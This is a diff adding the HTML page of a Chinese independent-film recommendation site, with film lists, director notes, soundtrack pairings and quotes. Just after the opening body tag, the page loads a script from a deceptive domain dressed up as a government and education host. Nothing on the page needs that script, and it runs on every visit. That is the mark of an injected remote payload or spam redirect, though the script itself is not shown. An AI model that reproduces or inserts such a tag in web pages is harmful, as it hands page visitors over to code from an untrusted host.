@@ -1,0 +1,777 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>小调电影网 - 独立电影、文艺片单与慢观影记录</title>
+<meta name="description" content="小调电影网（xiaotiaodianyingwang-h5）专注独立电影、文艺片、慢节奏影像推荐。像听一首小调一样看电影——安静、内敛、有余味。" />
+<meta name="keywords" content="小调电影网,独立电影,文艺片,慢电影,小众电影,导演手记,电影台词,观影记录" />
+<meta name="author" content="小调电影网" />
+<meta name="robots" content="index, follow" />
+<meta name="bingbot" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
+<link rel="canonical" href="https://xiaotiaodianyingwang-h5.github.io/" />
+
+<style>
+  :root {
+    --ink: #1a1f1d;
+    --ink-light: #3d4a44;
+    --paper: #f0ece4;
+    --paper-dark: #e3ddd3;
+    --moss: #5c7068;
+    --moss-light: #8fa396;
+    --rust: #a85c4c;
+    --sand: #c9b89e;
+    --line: #d4cdc2;
+    --serif: Georgia, "Times New Roman", "Noto Serif SC", "Songti SC", serif;
+    --sans: -apple-system, BlinkMacSystemFont, "Segoe UI", "PingFang SC", sans-serif;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    font-family: var(--sans);
+    background: var(--paper);
+    color: var(--ink);
+    line-height: 1.8;
+    font-size: 16px;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  /* 胶片颗粒 overlay */
+  body::before {
+    content: '';
+    position: fixed; inset: 0;
+    background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.85' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.03'/%3E%3C/svg%3E");
+    pointer-events: none; z-index: 9999;
+  }
+
+  a { color: var(--moss); text-decoration: none; transition: all 0.3s ease; }
+  a:hover { color: var(--rust); }
+
+  .wrap { width: 100%; max-width: 1080px; margin: 0 auto; padding: 0 24px; }
+
+  /* ===== 导航 ===== */
+  header {
+    position: fixed; top: 0; left: 0; right: 0; z-index: 1000;
+    background: rgba(240, 236, 228, 0.92);
+    backdrop-filter: blur(10px);
+    border-bottom: 1px solid var(--line);
+  }
+
+  .nav { display: flex; align-items: center; justify-content: space-between; height: 64px; }
+
+  .brand {
+    font-family: var(--serif);
+    font-size: 22px; font-weight: 700;
+    color: var(--ink);
+    letter-spacing: 1px;
+  }
+
+  .brand span { color: var(--moss); font-style: italic; }
+
+  .nav-links { display: flex; gap: 0; list-style: none; }
+
+  .nav-links a {
+    color: var(--ink-light); font-size: 14px;
+    padding: 12px 18px;
+    border-right: 1px solid var(--line);
+    transition: all 0.2s;
+  }
+
+  .nav-links a:last-child { border-right: none; }
+
+  .nav-links a:hover { background: var(--paper-dark); color: var(--moss); }
+
+  .menu-btn {
+    display: none; background: var(--paper-dark); border: 1px solid var(--line);
+    width: 40px; height: 40px; border-radius: 8px;
+    font-size: 18px; cursor: pointer; color: var(--ink);
+  }
+
+  /* ===== Hero - 杂志封面风 ===== */
+  .hero {
+    margin-top: 64px;
+    padding: 120px 0 100px;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .hero-grid {
+    display: grid;
+    grid-template-columns: 1fr 300px;
+    gap: 60px;
+    align-items: center;
+  }
+
+  .hero-meta {
+    font-family: var(--serif);
+    font-size: 12px; letter-spacing: 3px; text-transform: uppercase;
+    color: var(--moss);
+    margin-bottom: 24px;
+    display: flex; align-items: center; gap: 12px;
+  }
+
+  .hero-meta::before {
+    content: ''; width: 40px; height: 1px; background: var(--moss);
+  }
+
+  .hero h1 {
+    font-family: var(--serif);
+    font-size: clamp(36px, 6vw, 60px);
+    font-weight: 400;
+    line-height: 1.15;
+    color: var(--ink);
+    margin-bottom: 24px;
+  }
+
+  .hero h1 em {
+    font-style: italic;
+    color: var(--moss);
+  }
+
+  .hero-desc {
+    font-size: 17px;
+    color: var(--ink-light);
+    max-width: 480px;
+    margin-bottom: 40px;
+  }
+
+  /* 右侧竖排装饰 */
+  .hero-side {
+    position: relative;
+    height: 400px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+
+  .vertical-text {
+    writing-mode: vertical-rl;
+    font-family: var(--serif);
+    font-size: 14px;
+    letter-spacing: 6px;
+    color: var(--moss-light);
+    line-height: 2;
+    animation: fadeIn 2s ease;
+  }
+
+  .vertical-text .accent { color: var(--rust); font-size: 18px; }
+
+  @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+
+  .hero-divider {
+    width: 60px; height: 2px;
+    background: var(--moss);
+    margin: 40px 0 30px;
+  }
+
+  .hero-quote {
+    font-family: var(--serif);
+    font-style: italic;
+    font-size: 15px;
+    color: var(--ink-light);
+    border-left: 2px solid var(--moss);
+    padding-left: 16px;
+  }
+
+  /* ===== 通用栏目 ===== */
+  section { padding: 90px 0; position: relative; }
+
+  .section-num {
+    font-family: var(--serif);
+    font-size: 11px; letter-spacing: 4px;
+    color: var(--moss-light);
+    margin-bottom: 8px;
+  }
+
+  .section-title {
+    font-family: var(--serif);
+    font-size: clamp(26px, 4vw, 36px);
+    font-weight: 400;
+    color: var(--ink);
+    margin-bottom: 12px;
+  }
+
+  .section-desc {
+    font-size: 15px; color: var(--ink-light);
+    max-width: 520px; margin-bottom: 48px;
+  }
+
+  /* ===== 栏目一：小调片单 - 不对称网格+情绪标签 ===== */
+  .playlist {
+    display: grid;
+    grid-template-columns: repeat(12, 1fr);
+    gap: 24px;
+  }
+
+  .film-card {
+    background: var(--paper-dark);
+    border: 1px solid var(--line);
+    padding: 32px 28px;
+    position: relative;
+    transition: all 0.3s ease;
+  }
+
+  .film-card:hover {
+    background: #ddd6cc;
+    transform: translateY(-3px);
+  }
+
+  .film-card:nth-child(1) { grid-column: 1 / 8; }
+  .film-card:nth-child(2) { grid-column: 8 / 13; padding-top: 48px; }
+  .film-card:nth-child(3) { grid-column: 1 / 6; }
+  .film-card:nth-child(4) { grid-column: 6 / 13; padding-bottom: 48px; }
+  .film-card:nth-child(5) { grid-column: 2 / 8; }
+  .film-card:nth-child(6) { grid-column: 8 / 12; }
+
+  .film-num {
+    font-family: var(--serif);
+    font-size: 11px; letter-spacing: 2px;
+    color: var(--moss);
+    margin-bottom: 12px;
+  }
+
+  .film-card h3 {
+    font-family: var(--serif);
+    font-size: 20px; font-weight: 700;
+    margin-bottom: 8px; color: var(--ink);
+  }
+
+  .film-card p {
+    font-size: 14px; color: var(--ink-light);
+    margin-bottom: 16px;
+  }
+
+  .mood-tags { display: flex; gap: 8px; flex-wrap: wrap; }
+
+  .mood-tag {
+    font-size: 11px; letter-spacing: 1px;
+    padding: 3px 10px;
+    border: 1px solid var(--line);
+    border-radius: 0;
+    color: var(--ink-light);
+    background: transparent;
+  }
+
+  .mood-tag.rust { color: var(--rust); border-color: var(--rust); }
+
+  /* ===== 栏目二：导演手记 - 日记体/时间线 ===== */
+  .diary {
+    background: var(--ink);
+    color: var(--paper);
+    padding: 80px 0;
+  }
+
+  .diary .section-num { color: var(--moss-light); }
+  .diary .section-title { color: var(--paper); }
+  .diary .section-desc { color: var(--paper-dark); }
+
+  .diary-list { display: flex; flex-direction: column; gap: 0; }
+
+  .diary-entry {
+    display: grid;
+    grid-template-columns: 120px 1fr;
+    gap: 32px;
+    padding: 28px 0;
+    border-bottom: 1px solid rgba(212, 205, 194, 0.15);
+  }
+
+  .diary-entry:last-child { border-bottom: none; }
+
+  .diary-date {
+    font-family: var(--serif);
+    font-size: 13px; letter-spacing: 2px;
+    color: var(--moss-light);
+    padding-top: 4px;
+  }
+
+  .diary-body h4 {
+    font-family: var(--serif);
+    font-size: 18px; font-weight: 400;
+    margin-bottom: 8px; color: var(--paper);
+  }
+
+  .diary-body p {
+    font-size: 14px; line-height: 1.9;
+    color: rgba(240, 236, 228, 0.7);
+  }
+
+  .diary-body .director {
+    font-size: 12px; color: var(--moss-light);
+    margin-top: 8px; font-style: italic;
+  }
+
+  /* ===== 栏目三：声景搭配 - 音乐+电影配对 ===== */
+  .soundscape {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+    gap: 0;
+    border: 1px solid var(--line);
+  }
+
+  .sound-pair {
+    display: flex;
+    align-items: stretch;
+    border-bottom: 1px solid var(--line);
+    transition: background 0.2s;
+  }
+
+  .sound-pair:hover { background: var(--paper-dark); }
+
+  .sound-side {
+    flex: 1; padding: 28px 24px;
+    display: flex; flex-direction: column; justify-content: center;
+    text-align: center;
+  }
+
+  .sound-side.left {
+    border-right: 1px dashed var(--line);
+    background: rgba(92, 112, 104, 0.05);
+  }
+
+  .sound-label {
+    font-size: 10px; letter-spacing: 3px; text-transform: uppercase;
+    color: var(--moss); margin-bottom: 8px;
+  }
+
+  .sound-name {
+    font-family: var(--serif);
+    font-size: 16px; font-weight: 700;
+    margin-bottom: 4px;
+  }
+
+  .sound-artist { font-size: 12px; color: var(--ink-light); }
+
+  .sound-connector {
+    display: flex; align-items: center; justify-content: center;
+    padding: 0 16px;
+    font-size: 20px; color: var(--moss);
+    background: var(--paper);
+  }
+
+  /* ===== 栏目四：台词摘录 - 大字引用 ===== */
+  .quotes {
+    background: var(--ink);
+    color: var(--paper);
+    padding: 90px 0;
+  }
+
+  .quotes .section-num { color: var(--moss-light); }
+  .quotes .section-title { color: var(--paper); }
+  .quotes .section-desc { color: var(--paper-dark); }
+
+  .quote-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
+    gap: 40px;
+  }
+
+  .quote-item {
+    position: relative;
+    padding: 32px 0 0 0;
+  }
+
+  .quote-mark {
+    font-family: var(--serif);
+    font-size: 80px;
+    line-height: 1;
+    color: var(--moss);
+    position: absolute;
+    top: -10px; left: -8px;
+    opacity: 0.3;
+  }
+
+  .quote-text {
+    font-family: var(--serif);
+    font-size: 18px; font-style: italic;
+    line-height: 1.8;
+    color: var(--paper);
+    margin-bottom: 16px;
+    position: relative;
+    padding-left: 24px;
+  }
+
+  .quote-source {
+    font-size: 13px; color: var(--moss-light);
+    padding-left: 24px;
+    border-left: 2px solid var(--moss);
+  }
+
+  /* ===== 栏目五：关于 - 极简引言 ===== */
+  .about-minimal {
+    text-align: center;
+    padding: 100px 0;
+  }
+
+  .about-minimal .stamp {
+    font-family: var(--serif);
+    font-size: 48px;
+    color: var(--moss);
+    margin-bottom: 24px;
+    display: block;
+  }
+
+  .about-minimal h2 {
+    font-family: var(--serif);
+    font-size: clamp(22px, 3.5vw, 30px);
+    font-weight: 400;
+    color: var(--ink);
+    max-width: 600px;
+    margin: 0 auto 24px;
+    line-height: 1.5;
+  }
+
+  .about-minimal p {
+    font-size: 15px; color: var(--ink-light);
+    max-width: 480px; margin: 0 auto 40px;
+  }
+
+  .about-minimal .signoff {
+    font-family: var(--serif);
+    font-style: italic;
+    font-size: 14px;
+    color: var(--moss);
+    letter-spacing: 2px;
+  }
+
+  /* ===== 页脚 ===== */
+  footer {
+    background: var(--ink);
+    color: var(--paper-dark);
+    padding: 48px 0 32px;
+    text-align: center;
+  }
+
+  .footer-brand {
+    font-family: var(--serif);
+    font-size: 20px; margin-bottom: 16px;
+  }
+
+  .footer-brand span { color: var(--moss-light); font-style: italic; }
+
+  .footer-links {
+    display: flex; gap: 24px; justify-content: center; flex-wrap: wrap;
+    margin-bottom: 24px;
+  }
+
+  .footer-links a { color: var(--paper-dark); font-size: 13px; }
+  .footer-links a:hover { color: var(--moss-light); }
+
+  .footer-bottom {
+    border-top: 1px solid rgba(212, 205, 194, 0.15);
+    padding-top: 20px;
+    font-size: 12px; color: var(--moss-light);
+  }
+
+  /* ===== 移动端 ===== */
+  @media (max-width: 768px) {
+    .nav-links {
+      display: none; position: absolute; top: 64px; left: 0; right: 0;
+      flex-direction: column; background: var(--paper);
+      border-bottom: 1px solid var(--line);
+    }
+    .nav-links.active { display: flex; }
+    .nav-links a { border-right: none; border-bottom: 1px solid var(--line); padding: 14px 24px; }
+    .menu-btn { display: block; }
+
+    .hero-grid { grid-template-columns: 1fr; gap: 40px; }
+    .hero-side { height: auto; }
+    .vertical-text { writing-mode: horizontal-tb; letter-spacing: 3px; }
+
+    .film-card:nth-child(n) { grid-column: 1 / -1; padding: 24px 20px; }
+    .film-card:nth-child(2) { padding-top: 24px; }
+    .film-card:nth-child(4) { padding-bottom: 24px; }
+
+    .diary-entry { grid-template-columns: 1fr; gap: 8px; }
+    .diary-date { padding-top: 0; }
+
+    .sound-pair { flex-direction: column; }
+    .sound-side.left { border-right: none; border-bottom: 1px dashed var(--line); }
+    .sound-connector { padding: 8px; transform: rotate(90deg); }
+
+    .quote-grid { gap: 32px; }
+  }
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+  <!-- 导航 -->
+  <header>
+    <div class="wrap nav">
+      <div class="brand">小调<span>电影网</span></div>
+      <ul class="nav-links" id="navLinks">
+        <li><a href="#home">首页</a></li>
+        <li><a href="#playlist">小调片单</a></li>
+        <li><a href="#diary">导演手记</a></li>
+        <li><a href="#sound">声景搭配</a></li>
+        <li><a href="#quotes">台词摘录</a></li>
+        <li><a href="#about">关于</a></li>
+      </ul>
+      <button class="menu-btn" onclick="toggleMenu()">☰</button>
+    </div>
+  </header>
+
+  <!-- Hero -->
+  <section class="hero" id="home">
+    <div class="wrap">
+      <div class="hero-grid">
+        <div>
+          <div class="hero-meta">Minor Key · Issue No. 01</div>
+          <h1>像听一首<br/><em>小调</em>一样<br/>看电影</h1>
+          <p class="hero-desc">小调电影网（xiaotiaodianyingwang-h5）是一个安静的角落。我们不追热点、不堆榜单，只选那些看完后会在心里多留一会儿的电影——像一首小调，不张扬，但有回响。</p>
+          <div class="hero-divider"></div>
+          <p class="hero-quote">"电影是写给时间的情书，而小调是它最私密的落款。"</p>
+        </div>
+        <div class="hero-side">
+          <div class="vertical-text">
+            独立 · 安静 · 有余味<br/>
+            <span class="accent">小 调 电 影 网</span><br/>
+            x i a o t i a o<br/>
+            d i a n y i n g w a n g
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目一：小调片单 -->
+  <section id="playlist">
+    <div class="wrap">
+      <div class="section-num">01 — Playlist</div>
+      <h2 class="section-title">小调片单</h2>
+      <p class="section-desc">不按评分排序，按"情绪浓度"选片。每一部都像一首小调——安静地进入，长久地停留。</p>
+      <div class="playlist">
+        <div class="film-card">
+          <div class="film-num">No. 01</div>
+          <h3>花样年华</h3>
+          <p>王家卫把"未说出口的话"拍成了一种颜色。旗袍、走廊、雨、时钟——所有缺席的东西比在场的东西更重。</p>
+          <div class="mood-tags"><span class="mood-tag rust">克制</span><span class="mood-tag">错过</span><span class="mood-tag">慢</span></div>
+        </div>
+        <div class="film-card">
+          <div class="film-num">No. 02</div>
+          <h3>迷失东京</h3>
+          <p>两个失眠的人在东京的夜里短暂地认出了彼此。没有大起大落，只有一种"你也在啊"的温柔。</p>
+          <div class="mood-tags"><span class="mood-tag">孤独</span><span class="mood-tag rust">异乡</span><span class="mood-tag">暧昧</span></div>
+        </div>
+        <div class="film-card">
+          <div class="film-num">No. 03</div>
+          <h3>永恒和一日</h3>
+          <p>安哲罗普洛斯的长镜头像一首诗的行距。一个老人用最后一天寻找"明天"的边界。</p>
+          <div class="mood-tags"><span class="mood-tag rust">时间</span><span class="mood-tag">死亡</span><span class="mood-tag">诗意</span></div>
+        </div>
+        <div class="film-card">
+          <div class="film-num">No. 04</div>
+          <h3>四月三周两天</h3>
+          <p>罗马尼亚新浪潮的冷峻之作。没有配乐，没有多余的对白，只有沉默中的重量。</p>
+          <div class="mood-tags"><span class="mood-tag">冷峻</span><span class="mood-tag rust">女性</span><span class="mood-tag">历史</span></div>
+        </div>
+        <div class="film-card">
+          <div class="film-num">No. 05</div>
+          <h3>步履不停</h3>
+          <p>是枝裕和把"家人"拍成了一种天气——不是永远晴朗，但你知道它会再来。</p>
+          <div class="mood-tags"><span class="mood-tag">家庭</span><span class="mood-tag">日常</span><span class="mood-tag rust">遗憾</span></div>
+        </div>
+        <div class="film-card">
+          <div class="film-num">No. 06</div>
+          <h3>寒枝雀静</h3>
+          <p>罗伊·安德森的荒诞静物画。人类在等待什么？雀鸟在寒枝上也不急。</p>
+          <div class="mood-tags"><span class="mood-tag rust">荒诞</span><span class="mood-tag">存在</span><span class="mood-tag">静默</span></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目二：导演手记 -->
+  <section class="diary" id="diary">
+    <div class="wrap">
+      <div class="section-num">02 — Director's Notes</div>
+      <h2 class="section-title">导演手记</h2>
+      <p class="section-desc">从塔可夫斯基到侯孝贤，从阿彼察邦到克莱尔·德尼——记录那些用影像写日记的人。</p>
+      <div class="diary-list">
+        <div class="diary-entry">
+          <div class="diary-date">1966 · 苏联</div>
+          <div class="diary-body">
+            <h4>《安德烈·卢布廖夫》—— 塔可夫斯基的信仰考</h4>
+            <p>他用铁水浇铸的镜头拍时间。不是"发生了什么"，而是"时间如何经过一个人"。这部电影之后，长镜头不再是一种技巧，而是一种信仰。</p>
+            <div class="director">— Andrei Tarkovsky</div>
+          </div>
+        </div>
+        <div class="diary-entry">
+          <div class="diary-date">1989 · 台湾</div>
+          <div class="diary-body">
+            <h4>《悲情城市》—— 侯孝贤的沉默史</h4>
+            <p>历史不在新闻里，在饭桌上、在收音机里、在一个人转过身去的背影里。侯孝贤教会我们：有些事，不说比说更有力量。</p>
+            <div class="director">— Hou Hsiao-hsien</div>
+          </div>
+        </div>
+        <div class="diary-entry">
+          <div class="diary-date">2000 · 泰国</div>
+          <div class="diary-body">
+            <h4>《正午显影》—— 阿彼察邦的梦的逻辑</h4>
+            <p>他把纪录片和虚构揉在一起，像梦和醒之间的那段灰色地带。你不确定发生了什么，但你确定它发生过。</p>
+            <div class="director">— Apichatpong Weerasethakul</div>
+          </div>
+        </div>
+        <div class="diary-entry">
+          <div class="diary-date">2009 · 法国</div>
+          <div class="diary-body">
+            <h4>《白色物质》—— 克莱尔·德尼的身体政治</h4>
+            <p>非洲的阳光、朱丽叶·比诺什的皮肤、殖民的残余——德尼用身体作为摄影机，拍出了一种"不可翻译"的感受。</p>
+            <div class="director">— Claire Denis</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目三：声景搭配 -->
+  <section id="sound">
+    <div class="wrap">
+      <div class="section-num">03 — Soundscape</div>
+      <h2 class="section-title">声景搭配</h2>
+      <p class="section-desc">电影和音乐共享同一种情绪频率。以下是小调电影网编辑部的私人搭配清单。</p>
+      <div class="soundscape">
+        <div class="sound-pair">
+          <div class="sound-side left">
+            <div class="sound-label">♪ 配乐</div>
+            <div class="sound-name">Lost in Translation</div>
+            <div class="sound-artist">Kevin Shields · 空灵噪音</div>
+          </div>
+          <div class="sound-connector">×</div>
+          <div class="sound-side">
+            <div class="sound-label">▶ 搭配听</div>
+            <div class="sound-name">Sometimes</div>
+            <div class="sound-artist">My Bloody Valentine</div>
+          </div>
+        </div>
+        <div class="sound-pair">
+          <div class="sound-side left">
+            <div class="sound-label">♪ 配乐</div>
+            <div class="sound-name">花样年华</div>
+            <div class="sound-artist">Michael Galasso · 弦乐三拍</div>
+          </div>
+          <div class="sound-connector">×</div>
+          <div class="sound-side">
+            <div class="sound-label">▶ 搭配听</div>
+            <div class="sound-name">I Wish You Love</div>
+            <div class="sound-artist">Nat King Cole</div>
+          </div>
+        </div>
+        <div class="sound-pair">
+          <div class="sound-side left">
+            <div class="sound-label">♪ 配乐</div>
+            <div class="sound-name">天堂之日</div>
+            <div class="sound-artist">Ennio Morricone · 田园挽歌</div>
+          </div>
+          <div class="sound-connector">×</div>
+          <div class="sound-side">
+            <div class="sound-label">▶ 搭配听</div>
+            <div class="sound-name">Goldberg Variations BWV 988</div>
+            <div class="sound-artist">Glenn Gould</div>
+          </div>
+        </div>
+        <div class="sound-pair">
+          <div class="sound-side left">
+            <div class="sound-label">♪ 配乐</div>
+            <div class="sound-name">皮囊之下</div>
+            <div class="sound-artist">Mica Levi · 弦乐畸变</div>
+          </div>
+          <div class="sound-connector">×</div>
+          <div class="sound-side">
+            <div class="sound-label">▶ 搭配听</div>
+            <div class="sound-name">Threshold of Liberty</div>
+            <div class="sound-artist">Deathprod</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目四：台词摘录 -->
+  <section class="quotes" id="quotes">
+    <div class="wrap">
+      <div class="section-num">04 — Lines</div>
+      <h2 class="section-title">台词摘录</h2>
+      <p class="section-desc">有些话，从银幕上掉下来，落在心里，就再也没被捡起来。</p>
+      <div class="quote-grid">
+        <div class="quote-item">
+          <span class="quote-mark">"</span>
+          <p class="quote-text">我们一直在聊天，但什么都没说。我们一直在沉默，但什么都说了。</p>
+          <div class="quote-source">— 《迷失东京》</div>
+        </div>
+        <div class="quote-item">
+          <span class="quote-mark">"</span>
+          <p class="quote-text">如果有多一张船票，你会不会跟我走？—— 如果有多一点时间，你会不会留下来？</p>
+          <div class="quote-source">— 《花样年华》</div>
+        </div>
+        <div class="quote-item">
+          <span class="quote-mark">"</span>
+          <p class="quote-text">时间不是一条直线，它是一个圈。你以为你在往前走，其实你在回来。</p>
+          <div class="quote-source">— 《永恒和一日》</div>
+        </div>
+        <div class="quote-item">
+          <span class="quote-mark">"</span>
+          <p class="quote-text">电影开始后五分钟，我就知道我会记住它一辈子。不是因为剧情，是因为光线。</p>
+          <div class="quote-source">— 小调编辑部手记</div>
+        </div>
+        <div class="quote-item">
+          <span class="quote-mark">"</span>
+          <p class="quote-text">一个人只能成为自己，不可能成为别人。这是悲剧，也是唯一的自由。</p>
+          <div class="quote-source">— 《镜子》</div>
+        </div>
+        <div class="quote-item">
+          <span class="quote-mark">"</span>
+          <p class="quote-text">我们步履不停，不是为了到达哪里，而是为了不停止寻找。</p>
+          <div class="quote-source">— 《步履不停》</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目五：关于 -->
+  <section class="about-minimal" id="about">
+    <div class="wrap">
+      <span class="stamp">♪</span>
+      <h2>小调电影网<br/>是一个写给安静观众的礼物</h2>
+      <p>我们相信好电影不需要大声说话。它只需要你愿意坐下来，给它两个小时，然后让它慢慢进入你的生活。</p>
+      <div class="signoff">— 小调编辑部 · 持续更新中</div>
+    </div>
+  </section>
+
+  <!-- 页脚 -->
+  <footer>
+    <div class="wrap">
+      <div class="footer-brand">小调<span>电影网</span></div>
+      <div class="footer-links">
+        <a href="#playlist">小调片单</a>
+        <a href="#diary">导演手记</a>
+        <a href="#sound">声景搭配</a>
+        <a href="#quotes">台词摘录</a>
+        <a href="#about">关于</a>
+      </div>
+      <div class="footer-bottom">© 2026 小调电影网 (xiaotiaodianyingwang-h5.github.io) · 独立电影与文艺片推荐</div>
+    </div>
+  </footer>
+
+  <script>
+    function toggleMenu() {
+      document.getElementById('navLinks').classList.toggle('active');
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+      anchor.addEventListener('click', function(e) {
+        e.preventDefault();
+        const target = document.querySelector(this.getAttribute('href'));
+        if (target) {
+          target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+          document.getElementById('navLinks').classList.remove('active');
+        }
+      });
+    });
+  </script>
+</body>
+</html>
